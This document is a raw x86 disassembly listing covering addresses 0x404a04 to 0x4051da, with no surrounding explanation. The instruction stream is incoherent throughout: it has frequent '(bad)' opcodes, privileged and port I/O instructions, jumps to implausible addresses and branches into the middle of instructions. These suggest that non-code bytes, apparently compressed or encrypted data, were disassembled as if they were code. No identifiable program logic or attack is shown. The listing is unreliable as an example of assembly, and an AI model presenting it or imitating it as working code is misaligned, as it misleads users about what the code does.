  404a04:	(bad)
  404a08:	mul    esp
  404a0a:	popa   
  404a0b:	adc    BYTE PTR [edx+0x7c],0xd4
  404a0f:	xlat   BYTE PTR ds:[ebx]
  404a10:	iret   
  404a11:	push   edi
  404a12:	fisubr WORD PTR [edi+0x74]
  404a15:	push   esi
  404a16:	adc    ecx,DWORD PTR [eax-0x3eac1eb4]
  404a1c:	xchg   DWORD PTR [ebx+0xde2ba58],edi
  404a22:	clc    
  404a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a24:	dec    DWORD PTR [ebx+eiz*8-0x6e]
  404a28:	in     al,0xcb
  404a2a:	hlt    
  404a2b:	out    0x0,eax
  404a2d:	mov    al,ds:0xb7219262
  404a32:	ret    0x5c74
  404a35:	dec    esi
  404a36:	xchg   edi,eax
  404a37:	rcr    DWORD PTR [esp+eiz*4+0x24593286],0x2
  404a3f:	gs shl edx,cl
  404a42:	jno    0x4049d7
  404a44:	push   ss
  404a45:	stc    
  404a46:	outs   dx,DWORD PTR ds:[esi]
  404a47:	rol    edx,0x85
  404a4a:	stos   BYTE PTR es:[edi],al
  404a4b:	popa   
  404a4c:	popa   
  404a4d:	ret    
  404a4e:	inc    ebp
  404a4f:	jnp    0x404a87
  404a51:	inc    ebx
  404a52:	push   0xcbded157
  404a57:	pop    esp
  404a58:	mov    DWORD PTR [ebx+0x9e2ee8],edi
  404a5e:	mov    esp,0x145ddb3e
  404a63:	ins    DWORD PTR es:[edi],dx
  404a64:	xchg   esp,eax
  404a65:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404a67:	xor    al,0xae
  404a69:	jbe    0x404a19
  404a6b:	repz imul ebp,DWORD PTR [ebx],0x9f590e55
  404a72:	mov    al,0x27
  404a75:	adc    DWORD PTR [eax+0x611c29df],0xe87b2191
  404a7f:	retf   
  404a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a81:	out    0xb1,al
  404a83:	push   eax
  404a84:	push   edx
  404a85:	cmp    al,0x71
  404a87:	ret    0xfe91
  404a8a:	ss loop 0x404a35
  404a8d:	mov    eax,0xed780230
  404a92:	into   
  404a93:	cmp    ebp,DWORD PTR [ecx+0x39ecbe55]
  404a99:	pop    ecx
  404a9a:	nop
  404a9b:	push   ds
  404a9c:	data16 adc ch,BYTE PTR [ecx-0x1b38b363]
  404aa3:	call   0x1238272d
  404aa8:	aaa    
  404aa9:	and    eax,0x84160cb0
  404aae:	stos   DWORD PTR es:[edi],eax
  404aaf:	clc    
  404ab0:	fwait
  404ab1:	inc    ecx
  404ab2:	add    dl,BYTE PTR [edi-0x32]
  404ab5:	aam    0xdd
  404ab7:	push   ds
  404ab8:	jecxz  0x404b1a
  404aba:	mov    ch,0x95
  404abc:	arpl   ax,ax
  404abe:	mov    esp,0x21379b25
  404ac3:	call   0xeb405420
  404ac8:	shr    edi,0x89
  404acb:	int3   
  404acc:	sbb    BYTE PTR [eax-0x5cc172c9],0xb7
  404ad3:	mov    ch,ch
  404ad5:	mov    cl,0x7
  404ad7:	add    eax,0x2da5d322
  404adc:	inc    ecx
  404add:	loope  0x404ae4
  404adf:	out    0x5b,al
  404ae1:	xor    DWORD PTR [esi],0x8fbda415
  404ae7:	add    BYTE PTR [ecx-0x5d],ch
  404aea:	push   eax
  404aeb:	(bad)  
  404aed:	lock in al,0x25
  404af0:	(bad)  
  404af1:	ja     0x404af6
  404af3:	and    dh,BYTE PTR [edx-0x37c7b2f1]
  404af9:	add    al,0x29
  404afb:	stos   BYTE PTR es:[edi],al
  404afc:	mov    esp,0x42e3ca35
  404b01:	pop    edi
  404b03:	das    
  404b04:	vmsave 
  404b07:	and    al,BYTE PTR [edi-0x26]
  404b0a:	scas   eax,DWORD PTR es:[edi]
  404b0b:	cmp    eax,0x57c57d33
  404b10:	ins    DWORD PTR es:[edi],dx
  404b11:	in     al,dx
  404b12:	scas   eax,DWORD PTR es:[edi]
  404b13:	mov    ebx,DWORD PTR [edx]
  404b15:	add    eax,DWORD PTR [ecx]
  404b17:	xchg   edi,eax
  404b18:	jmp    0xaaf:0xfdac354
  404b1f:	fwait
  404b20:	adc    eax,0x89269d4c
  404b25:	shl    BYTE PTR [ecx+0x51cf05fb],1
  404b2b:	and    DWORD PTR [esi+eax*2+0x1f],edi
  404b2f:	loope  0x404af5
  404b31:	ins    DWORD PTR es:[edi],dx
  404b32:	xchg   esp,eax
  404b33:	and    DWORD PTR [eax-0x5b],ecx
  404b36:	ins    DWORD PTR es:[edi],dx
  404b37:	stos   DWORD PTR es:[edi],eax
  404b38:	push   esp
  404b39:	test   BYTE PTR [edi-0x77],dl
  404b3c:	(bad)  
  404b3d:	call   FWORD PTR [ebp-0x464bf73e]
  404b43:	mov    ecx,0xeb05e1fc
  404b48:	jecxz  0x404bc5
  404b4a:	shl    bh,1
  404b4c:	ret    
  404b4d:	jge    0x404b7d
  404b4f:	jmp    0x7e6aff14
  404b54:	outs   dx,DWORD PTR ds:[esi]
  404b55:	int3   
  404b56:	adc    al,BYTE PTR [eax+0x53]
  404b59:	cld    
  404b5a:	out    0x0,al
  404b5c:	mov    ch,0x19
  404b5e:	hlt    
  404b5f:	fwait
  404b60:	dec    edx
  404b61:	xchg   ebx,eax
  404b62:	sti    
  404b63:	adc    dl,ah
  404b65:	cmp    ecx,edx
  404b67:	in     eax,0xff
  404b69:	mov    dl,BYTE PTR [ecx]
  404b6b:	div    DWORD PTR [esi]
  404b6d:	stos   BYTE PTR es:[edi],al
  404b6e:	xchg   ebp,eax
  404b6f:	sbb    al,0x4b
  404b71:	mov    edi,0xef24c2b7
  404b76:	es dec edi
  404b78:	cld    
  404b79:	jmp    0xbb7126f1
  404b7e:	clc    
  404b7f:	es stc 
  404b81:	hlt    
  404b82:	int    0x23
  404b84:	add    al,0x34
  404b86:	bound  esi,QWORD PTR [ebp-0x43dbb5c7]
  404b8c:	leave  
  404b8d:	sub    ch,cl
  404b8f:	jns    0x404b29
  404b91:	push   0x10
  404b93:	loopne 0x404b37
  404b95:	enter  0x5658,0xb9
  404b99:	leave  
  404b9a:	sti    
  404b9b:	nop
  404b9c:	stos   BYTE PTR es:[edi],al
  404b9d:	xchg   edx,eax
  404b9e:	out    dx,eax
  404b9f:	mov    ah,0x58
  404ba1:	ins    DWORD PTR es:[edi],dx
  404ba2:	mov    gs,WORD PTR [edx+0x28]
  404ba5:	push   cs
  404ba6:	jae    0x404b44
  404ba8:	popa   
  404ba9:	jl     0x404b9c
  404bab:	jno    0x404bd1
  404bad:	in     eax,dx
  404bae:	jmp    0x86b0c9f8
  404bb3:	mov    ds:0x20760447,al
  404bb8:	jnp    0x404bdb
  404bba:	cmp    eax,0x105c4370
  404bbf:	arpl   WORD PTR [esi-0x22],si
  404bc2:	xchg   ebx,eax
  404bc3:	sub    DWORD PTR ds:0x11479120,edx
  404bc9:	push   ebp
  404bca:	ret    0x6185
  404bcd:	popa   
  404bce:	mov    es,ebp
  404bd0:	xchg   ebx,eax
  404bd1:	ret    0x4789
  404bd4:	xor    DWORD PTR [ecx-0x2e7027e5],0xffffffb0
  404bdb:	push   ss
  404bdc:	mov    bh,BYTE PTR [esi+0x67a7a002]
  404be2:	scas   eax,DWORD PTR es:[edi]
  404be3:	push   0x46839b53
  404be8:	rcl    DWORD PTR [ecx+0x402b1322],1
  404bee:	xchg   ebx,eax
  404bef:	push   edx
  404bf0:	sar    BYTE PTR [eax],1
  404bf2:	push   esp
  404bf3:	repnz outs dx,DWORD PTR ds:[esi]
  404bf5:	mov    al,ds:0xe5db7ebe
  404bfa:	pop    edx
  404bfb:	and    ebx,DWORD PTR [esi+0x6b]
  404bfe:	outs   dx,DWORD PTR ds:[esi]
  404bff:	mov    bl,0xe1
  404c01:	jecxz  0x404c5c
  404c03:	(bad)  
  404c05:	xor    bl,BYTE PTR [ebx+esi*4]
  404c08:	adc    esp,ebp
  404c0a:	mov    ebp,0x62f2123a
  404c0f:	test   al,0x61
  404c11:	into   
  404c12:	aaa    
  404c13:	fs iret 
  404c15:	adc    dl,BYTE PTR [esi]
  404c17:	retf   0x380c
  404c1a:	jns    0x404c60
  404c1c:	sub    al,0xbf
  404c1e:	pop    eax
  404c1f:	(bad)  
  404c21:	into   
  404c22:	test   DWORD PTR [edx],esi
  404c24:	dec    edx
  404c25:	push   ebx
  404c26:	iret   
  404c27:	retf   
  404c28:	xchg   esp,eax
  404c29:	int    0x9d
  404c2b:	imul   esp,DWORD PTR [ebp+0x4f4497cc],0xffffffdb
  404c32:	std    
  404c33:	out    dx,eax
  404c34:	call   0x558b:0x39610894
  404c3b:	daa    
  404c3c:	fadd   QWORD PTR [esi-0x11]
  404c3f:	test   eax,0xff8c484d
  404c44:	push   esi
  404c45:	ror    esp,1
  404c47:	sub    eax,0xba165eb
  404c4c:	cwde   
  404c4d:	jp     0x404ca7
  404c4f:	outs   dx,BYTE PTR ds:[esi]
  404c50:	outs   dx,DWORD PTR ds:[esi]
  404c51:	fnstenv [ebx-0x52917ea5]
  404c57:	loop   0x404c10
  404c59:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404c5b:	nop
  404c5c:	add    eax,0x6fdf0cc1
  404c61:	mov    eax,DWORD PTR [edx+0xd]
  404c64:	xor    DWORD PTR [esi-0x4fb3d899],edx
  404c6a:	inc    esi
  404c6b:	xor    al,0xb3
  404c6d:	xor    eax,0xfae6e79a
  404c72:	sub    BYTE PTR [ecx-0x41],ah
  404c75:	pop    ss
  404c76:	(bad)  
  404c77:	jb     0x404c8b
  404c79:	mov    ebx,0x2efd972b
  404c7e:	mov    al,ds:0x4c98ab27
  404c83:	jo     0x404ca8
  404c85:	shl    ecx,0xec
  404c88:	js     0x404c7b
  404c8a:	rcr    DWORD PTR [eax-0x5238acae],0xb9
  404c91:	mov    esp,0xdf478590
  404c96:	loopne 0x404c2c
  404c98:	xchg   esi,ecx
  404c9a:	pop    edx
  404c9b:	int    0x82
  404c9d:	fild   QWORD PTR [ecx]
  404c9f:	cmp    cl,al
  404ca1:	shr    BYTE PTR [ebx],0xf3
  404ca4:	inc    eax
  404ca5:	cs add eax,0xa64f2eb2
  404cab:	adc    DWORD PTR [ebp+0x6e],0x21
  404caf:	std    
  404cb0:	jae    0x404ceb
  404cb2:	push   cs
  404cb3:	ficomp DWORD PTR [ebx-0x4b4736a8]
  404cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cbb:	(bad)  
  404cbc:	ror    esp,cl
  404cbe:	or     eax,esi
  404cc0:	jg     0x404c82
  404cc2:	inc    edx
  404cc3:	mov    edx,0xedcb88eb
  404cc8:	retf   
  404cc9:	mul    al
  404ccb:	cmp    eax,0xb96d5879
  404cd0:	fbld   TBYTE PTR [edi+0x42a3234c]
  404cd6:	xchg   ebp,eax
  404cd7:	dec    esi
  404cd8:	shr    DWORD PTR [ebp-0x74],0xd4
  404cdc:	jmp    0xfb78:0x6feed285
  404ce3:	out    0xc5,al
  404ce5:	gs arpl sp,dx
  404ce8:	cmc    
  404ce9:	mov    al,0x7c
  404ceb:	pusha  
  404cec:	xor    DWORD PTR [eax],esi
  404cee:	retf   0x90b5
  404cf1:	aad    0x1
  404cf3:	fistp  DWORD PTR [ebp-0x2f]
  404cf6:	fdiv   QWORD PTR ds:0x2bcf24ad
  404cfc:	mov    esi,0x19fafc58
  404d01:	adc    BYTE PTR [edi],0x96
  404d04:	sub    al,0x4e
  404d06:	sub    DWORD PTR [eax+0x58013d11],ebp
  404d0c:	push   edx
  404d0d:	jmp    0x404cc1
  404d0f:	fsubr  st,st(0)
  404d11:	mov    cs,WORD PTR [edx-0x75]
  404d14:	jae    0x404ca7
  404d16:	arpl   WORD PTR ds:[eax-0x6fe440d4],di
  404d1d:	pusha  
  404d1e:	(bad)  
  404d1f:	add    BYTE PTR [edx+0x4aedeb18],bh
  404d25:	ja     0x404d7d
  404d27:	std    
  404d28:	loope  0x404d78
  404d2a:	xchg   esi,eax
  404d2b:	push   ebp
  404d2c:	push   es
  404d2d:	add    al,0x9c
  404d2f:	icebp  
  404d30:	ins    DWORD PTR es:[edi],dx
  404d31:	or     ebp,esp
  404d33:	ds dec ecx
  404d35:	mov    bl,0xd5
  404d37:	lods   al,BYTE PTR ds:[esi]
  404d38:	imul   ebp,DWORD PTR [ebx-0x7e],0xfffffff7
  404d3c:	cli    
  404d3d:	test   eax,0xb0bcfb54
  404d42:	dec    ebx
  404d43:	out    dx,al
  404d44:	ja     0x404d09
  404d46:	xchg   ebx,eax
  404d47:	clc    
  404d48:	pop    esp
  404d49:	mov    dl,BYTE PTR [edi+0x5cf90f6f]
  404d4f:	jnp    0x404d82
  404d51:	sbb    ecx,DWORD PTR [ebx+0x39c82b4a]
  404d57:	add    ebp,ebx
  404d59:	mov    ch,0xb4
  404d5b:	es (bad) 
  404d5d:	arpl   WORD PTR [eax-0x8],ax
  404d60:	aad    0xc2
  404d62:	xchg   BYTE PTR [ebp+0x48],al
  404d65:	sub    dl,BYTE PTR [ebp-0x8aa2d4e]
  404d6b:	mul    ecx
  404d6d:	adc    bl,BYTE PTR [edx+0x2a]
  404d70:	mov    bh,0xa
  404d72:	push   edx
  404d73:	push   0x41
  404d75:	jmp    0x404d6d
  404d77:	push   eax
  404d78:	cld    
  404d79:	fcmovu st,st(3)
  404d7b:	cmc    
  404d7c:	and    eax,0xbf6bc1d1
  404d81:	mov    dh,0xeb
  404d83:	jge    0x404d4a
  404d85:	dec    edi
  404d86:	pop    ecx
  404d87:	adc    esi,edx
  404d89:	in     eax,0xad
  404d8b:	ins    DWORD PTR es:[edi],dx
  404d8c:	dec    esi
  404d8d:	and    eax,ecx
  404d8f:	imul   esi,DWORD PTR [esi-0x6e844343],0x7546fb43
  404d99:	jbe    0x404d9a
  404d9b:	(bad)  
  404d9c:	fist   WORD PTR [edi]
  404d9e:	nop
  404d9f:	and    eax,0x676cedb0
  404da4:	popf   
  404da5:	sub    al,BYTE PTR [eax]
  404da7:	sbb    eax,0x496ac015
  404dac:	cmc    
  404dad:	or     BYTE PTR [edx+eax*2+0x5b84d8c5],bl
  404db4:	dec    edi
  404db5:	dec    ecx
  404db6:	std    
  404db7:	mov    edx,0xa8ac4291
  404dbc:	mov    edi,0x4815f645
  404dc1:	cs lahf 
  404dc3:	xor    al,0x43
  404dc5:	mov    edx,0xf62a3ad8
  404dca:	ja     0x404e26
  404dcc:	adc    edi,eax
  404dce:	fcom   st(2)
  404dd0:	pop    DWORD PTR [esi+0x283c8515]
  404dd6:	fld    TBYTE PTR [ecx-0x6fb487da]
  404ddc:	jno    0x404d87
  404dde:	sub    ah,BYTE PTR [edx-0x38]
  404de1:	pop    ecx
  404de2:	or     eax,DWORD PTR [ecx]
  404de4:	pop    ebx
  404de5:	(bad)  
  404de6:	cmp    dl,dl
  404de8:	fnsave [ecx+0x15a43589]
  404dee:	outs   dx,BYTE PTR ds:[esi]
  404def:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df1:	pop    edi
  404df2:	dec    ebp
  404df3:	adc    esi,DWORD PTR ds:0x671c5fee
  404df9:	pop    eax
  404dfa:	out    0x9c,al
  404dfc:	data16 aas 
  404dfe:	jle    0x404e47
  404e00:	mov    cl,0x23
  404e02:	(bad)  
  404e03:	mov    eax,0xe3bb72b0
  404e08:	push   cs
  404e09:	pop    ebx
  404e0a:	jge    0x404da0
  404e0c:	out    0xb6,al
  404e0e:	loopne 0x404e70
  404e10:	(bad)
  404e13:	lock stos BYTE PTR es:[edi],al
  404e15:	and    eax,0x322f4f25
  404e1a:	popa   
  404e1b:	into   
  404e1c:	fwait
  404e1d:	in     eax,0x30
  404e1f:	jl     0x404ddd
  404e21:	call   FWORD PTR [ecx-0x64fa9251]
  404e27:	adc    eax,ebx
  404e29:	cmp    DWORD PTR [ecx],0xffffffb6
  404e2c:	in     al,0x2f
  404e2e:	jmp    0x7e414a
  404e33:	pop    ebx
  404e34:	ins    DWORD PTR es:[edi],dx
  404e35:	lods   eax,DWORD PTR ds:[esi]
  404e36:	or     ebx,DWORD PTR [ecx+0x34]
  404e39:	mov    eax,0x7fa8ed5d
  404e3e:	cmp    al,0x63
  404e40:	sahf   
  404e41:	stos   DWORD PTR es:[edi],eax
  404e42:	and    eax,0x6a6e812d
  404e47:	cmp    DWORD PTR cs:[ecx],edi
  404e4a:	lahf   
  404e4b:	shl    BYTE PTR gs:[edi-0x23],0x6f
  404e50:	shl    BYTE PTR [esi-0x63],cl
  404e53:	push   ebp
  404e54:	jle    0x404e51
  404e56:	sub    DWORD PTR [eax+0x68],ebx
  404e59:	push   ds
  404e5a:	shr    BYTE PTR cs:[edx],0x89
  404e5e:	inc    esi
  404e5f:	mov    esp,ds
  404e61:	lods   al,BYTE PTR ds:[esi]
  404e62:	mov    ah,0xa
  404e64:	sub    eax,esi
  404e66:	cmp    bl,dh
  404e68:	stos   DWORD PTR es:[edi],eax
  404e69:	lea    ebp,[ebp-0x31]
  404e6c:	sbb    DWORD PTR [ebx],0x6d1d1d0d
  404e72:	jnp    0x404e92
  404e74:	test   DWORD PTR [edi+eiz*4+0x386d9765],ebx
  404e7b:	call   DWORD PTR [ecx+0x1514de96]
  404e81:	or     ebp,esp
  404e83:	(bad)  
  404e84:	lahf   
  404e85:	in     eax,0xa0
  404e87:	jmp    0x404e40
  404e89:	popa   
  404e8a:	jnp    0x404e6b
  404e8c:	std    
  404e8d:	fxtract 
  404e8f:	add    al,ch
  404e91:	mov    ecx,0x227f0d2e
  404e96:	mov    esp,0x346ac5f2
  404e9b:	pop    esp
  404e9c:	jo     0x404e90
  404e9e:	xchg   edi,eax
  404e9f:	cmp    eax,0x421e0ed1
  404ea4:	aas    
  404ea5:	js     0x404e30
  404ea7:	popf   
  404ea8:	mov    bh,0xda
  404eaa:	js     0x404eca
  404eac:	dec    edi
  404ead:	stos   DWORD PTR es:[di],eax
  404eaf:	cmp    al,0xaf
  404eb1:	inc    esi
  404eb2:	mov    ch,bh
  404eb4:	pop    ebp
  404eb5:	push   esi
  404eb6:	mov    ebp,0x1a396c7
  404ebb:	or     DWORD PTR [esi-0x592bb3a2],esi
  404ec1:	mov    esp,DWORD PTR [edx+ebp*8-0x71]
  404ec5:	es test eax,0xa38490b8
  404ecb:	arpl   bx,bx
  404ecd:	jns    0x404e6c
  404ecf:	mov    al,0x2c
  404ed1:	adc    esp,DWORD PTR [ecx+0x6bf4ce7e]
  404ed7:	aad    0xfa
  404ed9:	sbb    DWORD PTR [eax+0x77ee8d4b],ecx
  404edf:	jnp    0x404ec0
  404ee1:	jg     0x404f1d
  404ee3:	pushf  
  404ee4:	mov    dl,0xf2
  404ee6:	xor    BYTE PTR [esi+0x19c5ff87],bl
  404eec:	mov    eax,ds:0x3dbcd0dc
  404ef1:	xchg   edi,eax
  404ef2:	jae    0x404e97
  404ef4:	cs iret 
  404ef6:	jbe    0x404f04
  404ef8:	gs add al,0x9a
  404efb:	mov    edx,eax
  404efd:	aas    
  404efe:	push   es
  404eff:	lods   eax,DWORD PTR ds:[esi]
  404f00:	xchg   al,ah
  404f02:	enter  0x5460,0x3b
  404f06:	jbe    0x404ec7
  404f08:	sub    ecx,ecx
  404f0a:	pop    ecx
  404f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f0c:	aad    0x25
  404f0e:	mul    DWORD PTR [ebx+ebp*4]
  404f11:	push   es
  404f12:	fist   DWORD PTR [eax+ecx*2+0x754ec38d]
  404f19:	ret    0x2730
  404f1c:	jno    0x404f00
  404f1e:	add    ebx,DWORD PTR [edi+0x61]
  404f21:	jmp    0x404f6a
  404f23:	int3   
  404f24:	outs   dx,DWORD PTR ds:[esi]
  404f25:	imul   eax,DWORD PTR [ebx-0x60daf38a],0x9c77435f
  404f2f:	pop    ds
  404f30:	and    ebp,DWORD PTR [esi-0x258a7e99]
  404f36:	jl     0x404fa5
  404f38:	out    dx,al
  404f39:	xor    esi,DWORD PTR [eax-0x55]
  404f3c:	stc    
  404f3d:	xor    DWORD PTR [eax-0x6529a44a],esp
  404f43:	push   ebx
  404f44:	add    DWORD PTR [esi+edi*4],esi
  404f47:	push   cs
  404f48:	ret    0x27a4
  404f4b:	pusha  
  404f4c:	adc    BYTE PTR [edi+esi*8],0x48
  404f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f51:	mov    fs,WORD PTR [ebx-0x53]
  404f54:	in     eax,dx
  404f55:	mov    ch,0xfc
  404f57:	mov    ch,0x11
  404f59:	jp     0x404ee6
  404f5b:	or     bl,al
  404f5d:	sbb    BYTE PTR [ecx+0x5ac4b2ea],bh
  404f63:	add    eax,DWORD PTR [edi+0x7fc004e6]
  404f69:	stc    
  404f6a:	xchg   edi,eax
  404f6b:	shl    DWORD PTR [edi],cl
  404f6d:	push   es
  404f6e:	push   0x1bbb7049
  404f73:	inc    esp
  404f74:	sub    esp,DWORD PTR [edi+0x24db0cdb]
  404f7a:	pop    edi
  404f7b:	scas   al,BYTE PTR es:[edi]
  404f7c:	mov    ds:0x4f542a77,eax
  404f81:	fld    DWORD PTR fs:[ebp*1+0x1addb750]
  404f89:	loopne 0x404f4b
  404f8b:	rcr    BYTE PTR [ecx-0x2aa0914c],0x30
  404f92:	mov    dh,0x71
  404f94:	enter  0x295b,0xae
  404f98:	mov    ah,0x4c
  404f9a:	inc    ecx
  404f9b:	mov    eax,esi
  404f9d:	cwde   
  404f9e:	mov    ds:0xe9eababd,al
  404fa3:	xor    DWORD PTR [ebp-0x6c26166f],edx
  404fa9:	dec    esi
  404faa:	test   al,0x6b
  404fac:	jge    0x404f4c
  404fae:	add    BYTE PTR [ebx+0x77],dh
  404fb1:	loop   0x404f74
  404fb3:	(bad)  
  404fb5:	retf   
  404fb6:	aas    
  404fb7:	(bad)  
  404fb8:	fidiv  DWORD PTR [ebp+eiz*8-0x7d]
  404fbc:	inc    esp
  404fbd:	cmp    edx,DWORD PTR [edx+0x3fb16fbc]
  404fc3:	mov    eax,ds:0xab3d22c
  404fc8:	(bad)  
  404fca:	cmp    BYTE PTR [ebx-0xc],0xec
  404fce:	push   ebp
  404fcf:	inc    edx
  404fd0:	ss rcr bh,1
  404fd3:	(bad)  
  404fd4:	xchg   edx,eax
  404fd5:	jne    0x404fc5
  404fd7:	test   eax,0x8b625eb3
  404fdc:	xchg   esi,eax
  404fdd:	cmp    eax,0xb87cda35
  404fe2:	jns    0x404fb9
  404fe4:	or     esi,DWORD PTR [ebx+esi*1-0x5cb24f40]
  404feb:	dec    ebx
  404fec:	or     DWORD PTR [esi+0x66],ebx
  404fef:	sub    eax,0x339ec4c1
  404ff4:	and    al,0xf3
  404ff6:	(bad)  
  404ff7:	out    dx,al
  404ff8:	in     al,dx
  404ff9:	retf   0x46e9
  404ffc:	jle    0x404fb8
  404ffe:	mov    ebp,0x44c9fcbf
  405003:	mov    ah,0x98
  405005:	or     esi,DWORD PTR [edi-0x6f8cf89c]
  40500b:	data16 mov bl,BYTE PTR [ecx+0x319966a7]
  405012:	lds    ecx,FWORD PTR [ebx+0x7e82f09]
  405018:	jns    0x405000
  40501a:	scas   al,BYTE PTR es:[edi]
  40501b:	bound  edi,QWORD PTR [edx-0x74e70765]
  405021:	test   eax,0x69030df9
  405026:	inc    eax
  405027:	pop    eax
  405028:	cwde   
  405029:	mov    eax,0x7c6ea79
  40502e:	icebp  
  40502f:	fst    DWORD PTR [ebx]
  405031:	pop    esi
  405032:	sub    eax,0x9ac472b
  405037:	popa   
  405038:	xor    dh,BYTE PTR [eax]
  40503a:	aam    0xd8
  40503c:	sbb    esp,DWORD PTR [esi+ebp*1]
  40503f:	jp     0x4050af
  405041:	jbe    0x405014
  405043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405044:	push   ecx
  405045:	mov    dl,0x1e
  405047:	mov    edx,eax
  405049:	push   0x1e
  40504b:	retf   
  40504c:	inc    edi
  40504d:	adc    BYTE PTR [eax+ebp*8+0x2d7475a2],dl
  405054:	jne    0x4050c3
  405056:	aad    0x3e
  405058:	add    ch,BYTE PTR [ebx-0x27d207ae]
  40505e:	imul   esi,DWORD PTR [esi-0x46],0x8be56c8e
  405065:	pushf  
  405066:	or     al,0x20
  405068:	push   ebx
  405069:	fcom   QWORD PTR [edx+0x56c75d4a]
  40506f:	xchg   esi,eax
  405070:	inc    ebx
  405071:	clc    
  405072:	and    al,0x1b
  405074:	inc    ecx
  405075:	inc    ebx
  405076:	or     eax,0xec99a334
  40507b:	push   edx
  40507c:	sub    cl,bh
  40507e:	and    ah,BYTE PTR [ebx+eiz*1+0x72]
  405082:	xor    al,0xb6
  405084:	sbb    ch,ah
  405086:	sub    DWORD PTR [edi-0x24],ecx
  405089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40508a:	dec    esi
  40508b:	addr16 pop ds
  40508d:	xchg   edi,eax
  40508e:	or     BYTE PTR es:0x17c336e3,0xb
  405096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405097:	imul   edx,DWORD PTR cs:[ebx-0x30],0xffffffa9
  40509c:	mov    dl,0x59
  40509e:	lods   eax,DWORD PTR ds:[esi]
  40509f:	cmp    al,0x8d
  4050a1:	sti    
  4050a2:	(bad)  [ecx]
  4050a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050a5:	pop    ds
  4050a6:	fsubr  QWORD PTR [ebx-0x6e45935f]
  4050ac:	rcr    BYTE PTR [edi],0x3a
  4050af:	xor    bl,BYTE PTR [ebp+0x3d0e0371]
  4050b5:	repz push esi
  4050b7:	cmp    BYTE PTR [esi-0xe],dl
  4050ba:	inc    ecx
  4050bb:	mov    al,fs:0x7b054b9
  4050c1:	mov    edi,0x4075bc8b
  4050c6:	pop    ds
  4050c7:	cmp    al,0x8e
  4050c9:	fidiv  WORD PTR [ebx+0x13]
  4050cc:	sub    edi,DWORD PTR [esi+0x7f7e2c2d]
  4050d2:	push   ecx
  4050d3:	push   eax
  4050d4:	mov    esi,DWORD PTR [edi]
  4050d6:	stos   DWORD PTR es:[edi],eax
  4050d7:	(bad)  
  4050d8:	jmp    0x4050e1
  4050da:	push   ebp
  4050db:	test   eax,0xe0a4d8e0
  4050e0:	mov    edx,0xef5f74f3
  4050e5:	mov    esi,0x1939239b
  4050ea:	inc    eax
  4050eb:	(bad)  
  4050ec:	mov    esp,0xd8283a75
  4050f1:	jnp    0x40514c
  4050f3:	(bad)  
  4050f4:	lods   eax,DWORD PTR ds:[esi]
  4050f5:	adc    bh,BYTE PTR [edi]
  4050f7:	push   0x7c
  4050f9:	pusha  
  4050fa:	sub    BYTE PTR [edx+0x489769a7],bh
  405100:	adc    DWORD PTR [ecx-0x76],eax
  405103:	test   DWORD PTR [ebx],0x13222bff
  405109:	out    dx,al
  40510a:	jns    0x4050b2
  40510c:	mov    ch,0x48
  40510e:	fsub   QWORD PTR [edx+0x740c4b16]
  405114:	and    eax,0xa433c0b4
  405119:	stc    
  40511a:	mov    esi,0xf27640aa
  40511f:	fcom   QWORD PTR [ebx+0x19]
  405122:	mov    dh,0x2f
  405124:	pop    eax
  405125:	test   DWORD PTR [esi-0x4670b6e],0xc85b89d
  40512f:	mov    ss,edx
  405131:	inc    ebx
  405132:	or     al,0xe5
  405134:	jo     0x40515d
  405136:	loope  0x405140
  405138:	cmp    ebx,ecx
  40513a:	or     bh,0x71
  40513d:	pop    esi
  40513e:	lahf   
  40513f:	fld    TBYTE PTR [ecx+0x2a635773]
  405145:	jmp    0xd7cebcce
  40514a:	aas    
  40514b:	cdq    
  40514c:	out    0xf1,eax
  40514e:	adc    al,0x96
  405150:	jne    0x40515a
  405152:	sub    ch,cl
  405154:	jge    0x4051a5
  405156:	nop
  405157:	aaa    
  405158:	fnsave [ecx+edi*2+0x78]
  40515c:	mov    dl,0xe9
  40515e:	pop    ebx
  40515f:	rcr    dl,cl
  405161:	daa    
  405162:	push   ebp
  405163:	retf   0xb6a2
  405166:	in     eax,0xec
  405168:	imul   DWORD PTR [eax+0xd0621ef]
  40516e:	xchg   DWORD PTR [eax+eiz*1-0x5f],eax
  405172:	add    al,0x93
  405174:	push   edi
  405175:	mov    esp,0x58683af
  40517a:	sahf   
  40517b:	dec    ecx
  40517c:	push   ebx
  40517d:	imul   eax,DWORD PTR [edi-0x7ee87e11],0x4563d371
  405187:	sbb    dl,BYTE PTR [edx+0x25]
  40518a:	mov    ds:0x2f636da,eax
  40518f:	ja     0x40516c
  405191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405192:	or     eax,0x8656e4d0
  405197:	inc    esp
  405198:	jmp    0x4051b1
  40519a:	popf   
  40519b:	pop    edi
  40519c:	sub    bl,BYTE PTR [ecx]
  40519e:	iret   
  40519f:	addr16 jo 0x40512e
  4051a2:	popa   
  4051a3:	xchg   ebp,eax
  4051a4:	mov    al,ds:0xcfe2e7a1
  4051a9:	(bad)  
  4051aa:	adc    ebp,ecx
  4051ac:	mov    ebx,0xdfe990bf
  4051b1:	mov    eax,ds:0x6c75fdc6
  4051b6:	push   ebp
  4051b7:	push   es
  4051b8:	cmp    BYTE PTR [edx-0x3aa182f9],dl
  4051be:	jo     0x40514e
  4051c0:	out    dx,eax
  4051c1:	pop    DWORD PTR [esi+0x28]
  4051c4:	adc    esp,DWORD PTR [esi+ecx*1+0x6ab16871]
  4051cb:	xchg   esi,eax
  4051cc:	cmp    edi,DWORD PTR [esi+0x5e1787f9]
  4051d2:	xchg   ebx,eax
  4051d3:	retf   0x9ef1
  4051d6:	popf   
  4051d7:	mov    al,0x92
  4051d9:	(bad)  
  4051da:	icebp  
